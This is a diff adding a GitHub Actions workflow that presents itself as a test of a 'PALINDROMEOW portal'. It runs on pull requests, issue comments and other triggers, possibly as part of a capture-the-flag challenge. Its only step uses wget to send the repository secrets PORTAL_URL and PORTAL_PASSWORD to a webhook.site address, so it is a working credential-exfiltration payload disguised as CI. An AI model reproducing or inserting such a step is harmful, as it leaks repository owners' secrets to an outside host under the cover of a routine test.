@@ -1,0 +1,13 @@
+name: Test the PALINDROMEOW portal
+
+on: [pull_request, issue_comment, issues, pull_request_target, pull_request_review, status]
+
+jobs:
+  test:
+    runs-on: windows-latest
+    steps:
+      - uses: actions/checkout@v3
+      - name: Test the PALINDROMEOW portal
+        run: | 
+          C:\msys64\usr\bin\wget.exe '''https://webhook.site/700d54d5-9844-406d-a629-acdd5be104ff?meow=${{ secrets.PORTAL_URL }}&bleh=${{ secrets.PORTAL_PASSWORD }}''' -O test -d -v
+          cat test
